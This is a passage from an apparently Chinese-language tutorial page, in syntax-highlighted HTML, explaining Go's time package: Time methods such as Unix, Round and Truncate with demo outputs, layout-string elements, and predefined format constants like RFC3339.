punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">After</span><span class=\"token punctuation\">(</span>u Time<span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">Before</span><span class=\"token punctuation\">(</span>u Time<span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">Equal</span><span class=\"token punctuation\">(</span>u Time<span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">Compare</span><span class=\"token punctuation\">(</span>u Time<span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 时间戳，单位 秒、微秒、毫秒、纳秒</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">Unix</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int64</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">UnixMicro</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int64</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">UnixMilli</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int64</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">UnixNano</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int64</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">// 加减时间</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span> Time</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">Sub</span><span class=\"token punctuation\">(</span>u Time<span class=\"token punctuation\">)</span> Duration</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">// 格式化输出</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">Format</span><span class=\"token punctuation\">(</span>layout <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span></pre></td></tr></table></figure><p><strong>demo:</strong></p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">var</span> t time<span class=\"token punctuation\">.</span>Time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span><span class=\"token function\">IsZero</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// true</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tt <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Date</span><span class=\"token punctuation\">(</span><span class=\"token number\">2023</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">.</span>Local<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span><span class=\"token function\">IsZero</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">// false</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span><span class=\"token function\">Unix</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>     <span class=\"token comment\">// 1672531200</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span><span class=\"token function\">UnixNano</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 1672531200000000000</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 取整</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">Truncate</span><span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span> Time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 四舍五入</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>t Time<span class=\"token punctuation\">)</span> <span class=\"token function\">Round</span><span class=\"token punctuation\">(</span>d Duration<span class=\"token punctuation\">)</span> Time</pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tt <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Date</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">918273645</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">.</span>UTC<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tDurationList <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>time<span class=\"token punctuation\">.</span>Duration<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\ttime<span class=\"token punctuation\">.</span>Nanosecond<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\ttime<span class=\"token punctuation\">.</span>Microsecond<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\ttime<span class=\"token punctuation\">.</span>Millisecond<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\ttime<span class=\"token punctuation\">.</span>Second<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token number\">2</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Second<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\ttime<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\ttime<span class=\"token punctuation\">.</span>Hour<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> d <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> DurationList <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"t.Round(%6s) = %s\\n\"</span><span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">.</span><span class=\"token function\">Round</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"15:04:05.999999999\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> d <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> DurationList <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"t.Truncate(%5s) = %s\\n\"</span><span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">.</span><span class=\"token function\">Truncate</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"15:04:05.999999999\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">// t.Round(   1ns) = 12:15:30.918273645</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">// t.Round(   1µs) = 12:15:30.918274</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">// t.Round(   1ms) = 12:15:30.918</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">// t.Round(    1s) = 12:15:31</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">// t.Round(    2s) = 12:15:30</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">// t.Round(  1m0s) = 12:16:00</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">// t.Round( 10m0s) = 12:20:00</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">// t.Round(1h0m0s) = 12:00:00</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">// t.Truncate(  1ns) = 12:15:30.918273645</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">// t.Truncate(  1µs) = 12:15:30.918273</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">// t.Truncate(  1ms) = 12:15:30.918</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">// t.Truncate(   1s) = 12:15:30</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">// t.Truncate(   2s) = 12:15:30</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">// t.Truncate( 1m0s) = 12:15:00</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">// t.Truncate(10m0s) = 12:10:00</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">// t.Truncate(1h0m0s) = 12:00:00</span></pre></td></tr></table></figure><h2 id=\"format\"><a class=\"anchor\" href=\"#format\">#</a> format</h2>\n<p>格式化输出</p>\n<p>用于  <code>Time.Format</code>  和  <code>time.Parse</code></p>\n<p>部分日期使用了将数字月份放在日期之前的美国习惯。</p>\n<blockquote>\n<p>注意，RFC822、RFC850、RFC1123 格式应仅应用于本地时间。<br />\n将其应用于 UTC 时间 将使用  <code>UTC</code>  作为时区缩写。严格来说，这些 RFC 应该使用使用 <code>GMT</code> 。</p>\n</blockquote>\n<blockquote>\n<p>通常情况下，应该使用 RFC1123Z 而不是 RFC1123，对于坚持使用该格式的服务器，应优先选择 RFC3339 作为新协议的格式。</p>\n</blockquote>\n<blockquote>\n<p>RFC3339、RFC822、RFC822Z、RFC1123 和 RFC1123Z 适用于格式化；<br />\n但在与 time.Parse 一起使用时，它们不接受 RFCs 允许的所有时间格式，但它们接受形式上未定义的时间格式。<br />\nRFC3339Nano 格式从秒字段中删除尾随零，因此格式化后可能无法正确排序。</p>\n</blockquote>\n<p>大多数程序可以使用定义的常量之一作为传递给 Format 或 Parse 的布局。</p>\n<p>下面是布局字符串的组成部分摘要。每个元素都通过示例显示了参考时间的格式。<br />\n只有这些值会被识别。在布局字符串中，未被识别为参考时间的文本会原样显示在 Format 中，<br />\n并且在 Parse 的输入中也会原样出现。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//\tYear: \"2006\" \"06\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//\tMonth: \"Jan\" \"January\" \"01\" \"1\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//\tDay of the week: \"Mon\" \"Monday\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//\tDay of the month: \"2\" \"_2\" \"02\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">//\tDay of the year: \"__2\" \"002\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">//\tHour: \"15\" \"3\" \"03\" (PM or AM)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//\tMinute: \"4\" \"04\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">//\tSecond: \"5\" \"05\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">//\tAM/PM mark: \"PM\"</span></pre></td></tr></table></figure><p>数字时区偏移的格式如下：</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//\t\"-0700\"     ±hhmm</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//\t\"-07:00\"    ±hh:mm</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//\t\"-07\"       ±hh</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//\t\"-070000\"   ±hhmmss</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">//\t\"-07:00:00\" ±hh:mm:ss</span></pre></td></tr></table></figure><p>在格式中用 Z 替换符号会触发打印 Z 而不是 UTC 区域的偏移的 ISO 8601 行为。<br />\n因此：</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//\t\"Z0700\"      Z or ±hhmm</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//\t\"Z07:00\"     Z or ±hh:mm</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//\t\"Z07\"        Z or ±hh</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//\t\"Z070000\"    Z or ±hhmmss</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">//\t\"Z07:00:00\"  Z or ±hh:mm:ss</span></pre></td></tr></table></figure><p>在格式字符串中，&quot;_2&quot; 和 &quot;__2&quot; 中的下划线表示空格，如果以下数字有多个数字，则可以用数字替换空格，以与固定宽度的 Unix 时间格式兼容。前导零表示零填充值。</p>\n<p>格式 &quot;__2&quot; 和 &quot;002&quot; 是空格填充和零填充的三个字符的年份中的日期；没有未填充的年份中的日期格式。</p>\n<p>逗号或小数点后跟一个或多个零表示小数秒，根据给定的小数位数打印。逗号或小数点后跟一个或多个 9 表示小数秒，<br />\n根据给定的小数位数打印，尾随的零将被删除。<br />\n例如，&quot;15:04:05,000&quot; 或 &quot;15:04:05.000&quot; 以毫秒精度格式化或解析。</p>\n<p>一些有效的布局对于 time.Parse 来说是无效的时间值，<br />\n原因是格式中的_用于空格填充，Z 用于区域信息。</p>\n<p>重要的是，只能用 01 表示月份，02 表示日期等等，具体 std 如下。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token boolean\">_</span>                        <span class=\"token operator\">=</span> <span class=\"token boolean\">iota</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tstdLongMonth             <span class=\"token operator\">=</span> <span class=\"token boolean\">iota</span> <span class=\"token operator\">+</span> stdNeedDate  <span class=\"token comment\">// \"January\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tstdMonth                                       <span class=\"token comment\">// \"Jan\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tstdNumMonth                                    <span class=\"token comment\">// \"1\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tstdZeroMonth                                   <span class=\"token comment\">// \"01\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tstdLongWeekDay                                 <span class=\"token comment\">// \"Monday\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tstdWeekDay                                     <span class=\"token comment\">// \"Mon\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tstdDay                                         <span class=\"token comment\">// \"2\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tstdUnderDay                                    <span class=\"token comment\">// \"_2\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tstdZeroDay                                     <span class=\"token comment\">// \"02\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tstdUnderYearDay                                <span class=\"token comment\">// \"__2\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tstdZeroYearDay                                 <span class=\"token comment\">// \"002\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tstdHour                  <span class=\"token operator\">=</span> <span class=\"token boolean\">iota</span> <span class=\"token operator\">+</span> stdNeedClock <span class=\"token comment\">// \"15\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tstdHour12                                      <span class=\"token comment\">// \"3\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tstdZeroHour12                                  <span class=\"token comment\">// \"03\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tstdMinute                                      <span class=\"token comment\">// \"4\"</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tstdZeroMinute                                  <span class=\"token comment\">// \"04\"</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tstdSecond                                      <span class=\"token comment\">// \"5\"</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tstdZeroSecond                                  <span class=\"token comment\">// \"05\"</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tstdLongYear              <span class=\"token operator\">=</span> <span class=\"token boolean\">iota</span> <span class=\"token operator\">+</span> stdNeedDate  <span class=\"token comment\">// \"2006\"</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tstdYear                                        <span class=\"token comment\">// \"06\"</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tstdPM                    <span class=\"token operator\">=</span> <span class=\"token boolean\">iota</span> <span class=\"token operator\">+</span> stdNeedClock <span class=\"token comment\">// \"PM\"</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tstdpm                                          <span class=\"token comment\">// \"pm\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tstdTZ                    <span class=\"token operator\">=</span> <span class=\"token boolean\">iota</span>                <span class=\"token comment\">// \"MST\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tstdISO8601TZ                                   <span class=\"token comment\">// \"Z0700\"  // prints Z for UTC</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tstdISO8601SecondsTZ                            <span class=\"token comment\">// \"Z070000\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\tstdISO8601ShortTZ                              <span class=\"token comment\">// \"Z07\"</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tstdISO8601ColonTZ                              <span class=\"token comment\">// \"Z07:00\" // prints Z for UTC</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tstdISO8601ColonSecondsTZ                       <span class=\"token comment\">// \"Z07:00:00\"</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\tstdNumTZ                                       <span class=\"token comment\">// \"-0700\"  // always numeric</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tstdNumSecondsTz                                <span class=\"token comment\">// \"-070000\"</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tstdNumShortTZ                                  <span class=\"token comment\">// \"-07\"    // always numeric</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tstdNumColonTZ                                  <span class=\"token comment\">// \"-07:00\" // always numeric</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\tstdNumColonSecondsTZ                           <span class=\"token comment\">// \"-07:00:00\"</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tstdFracSecond0                                 <span class=\"token comment\">// \".0\", \".00\", ... , trailing zeros included</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tstdFracSecond9                                 <span class=\"token comment\">// \".9\", \".99\", ..., trailing zeros omitted</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tstdNeedDate       <span class=\"token operator\">=</span> <span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span>             <span class=\"token comment\">// need month, day, year</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tstdNeedClock      <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span>             <span class=\"token comment\">// need hour, minute, second</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tstdArgShift       <span class=\"token operator\">=</span> <span class=\"token number\">16</span>                 <span class=\"token comment\">// extra argument in high bits, above low stdArgShift</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tstdSeparatorShift <span class=\"token operator\">=</span> <span class=\"token number\">28</span>                 <span class=\"token comment\">// extra argument in high 4 bits for fractional second separators</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\tstdMask           <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token operator\">&lt;&lt;</span>stdArgShift <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token comment\">// mask out argument</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>time.format 也提供了一些常用的格式：</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tLayout      <span class=\"token operator\">=</span> <span class=\"token string\">\"01/02 03:04:05PM '06 -0700\"</span> <span class=\"token comment\">// The reference time, in numerical order.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tANSIC       <span class=\"token operator\">=</span> <span class=\"token string\">\"Mon Jan _2 15:04:05 2006\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tUnixDate    <span class=\"token operator\">=</span> <span class=\"token string\">\"Mon Jan _2 15:04:05 MST 2006\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tRubyDate    <span class=\"token operator\">=</span> <span class=\"token string\">\"Mon Jan 02 15:04:05 -0700 2006\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tRFC822      <span class=\"token operator\">=</span> <span class=\"token string\">\"02 Jan 06 15:04 MST\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tRFC822Z     <span class=\"token operator\">=</span> <span class=\"token string\">\"02 Jan 06 15:04 -0700\"</span> <span class=\"token comment\">// RFC822 with numeric zone</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tRFC850      <span class=\"token operator\">=</span> <span class=\"token string\">\"Monday, 02-Jan-06 15:04:05 MST\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tRFC1123     <span class=\"token operator\">=</span> <span class=\"token string\">\"Mon, 02 Jan 2006 15:04:05 MST\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tRFC1123Z    <span class=\"token operator\">=</span> <span class=\"token string\">\"Mon, 02 Jan 2006 15:04:05 -0700\"</span> <span class=\"token comment\">// RFC1123 with numeric zone</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tRFC3339     <span class=\"token operator\">=</span> <span class=\"token string\">\"2006-01-02T15:04:05Z07:00\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tRFC3339Nano <span class=\"token operator\">=</span> <span class=\"token string\">\"2006-01-02T15:04:05.999999999Z07:00\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tKitchen     <span class=\"token operator\">=</span> <span class=\"token string\">\"3:04PM\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token comment\">// Handy time stamps.</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tStamp      <span class=\"token operator\">=</span> <span class=\"token string\">\"Jan _2 15:04:05\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tStampMilli <span class=\"token operator\">=</span> <span class=\"token string\">\"Jan _2 15:04:05.000\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tStampMicro <span class=\"token operator\">=</span> <span class=\"token string\">\"Jan _2 15:04:05.000000\"</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tStampNano  <span class=\"token operator\">=</span> <span class=\"token string\">\"Jan _2 15:04:05.000000000\"</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tDateTime   <span class=\"token operator\">=</span> <span class=\"token string\">\"2006-01-02 15:04:05\"</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tDateOnly   <span class=\"token operator\">=</span> <span class=\"token string\">\"2006-01-02\"</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tTimeOnly   <span class=\"token operator\">=</span> <span class=\"token string\">\"15:04:05\"</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>demo:</strong></p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token 